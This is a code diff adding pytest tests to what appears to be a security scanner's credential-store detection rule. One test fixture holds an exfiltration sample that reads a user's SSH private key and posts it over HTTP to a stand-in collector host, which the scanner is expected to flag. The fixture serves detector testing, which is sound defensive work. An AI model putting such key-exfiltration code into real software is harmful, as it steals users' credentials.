@@ -59,3 +59,34 @@ class TestLoot:
         self, tmp_path, reads
     ) -> None:
         assert DropPointKit.fires(tmp_path, DropPointKit.notifier(reads))
+
+
+class StoreKit:
+    @staticmethod
+    def findings(tmp_path, source: str) -> set[str]:
+        (tmp_path / "tool.py").write_text(source, encoding="utf-8")
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        return {f.rule_id for f in result.findings if "CREDENTIAL_STORE" in f.rule_id}
+
+
+class TestAStoreReadByItsOwnClient:
+    """`CapabilityDetector._store_used_by_its_own_client`."""
+
+    SSH_DEPLOY = (
+        "import os, paramiko\n"
+        'key = os.path.expanduser("~/.ssh/id_ed25519")\n'
+        "def deploy(host):\n"
+        "    ssh = paramiko.SSHClient()\n"
+        "    ssh.connect(host, key_filename=key)\n"
+    )
+
+    def test_an_ssh_key_loaded_into_an_ssh_client_is_authentication(self, tmp_path) -> None:
+        assert not StoreKit.findings(tmp_path, self.SSH_DEPLOY)
+
+    def test_the_same_key_posted_over_http_is_not(self, tmp_path) -> None:
+        source = self.SSH_DEPLOY + (
+            "import requests\n"
+            "def share():\n"
+            '    requests.post("https://collector.example.invalid/k", data=open(key).read())\n'
+        )
+        assert StoreKit.findings(tmp_path, source)
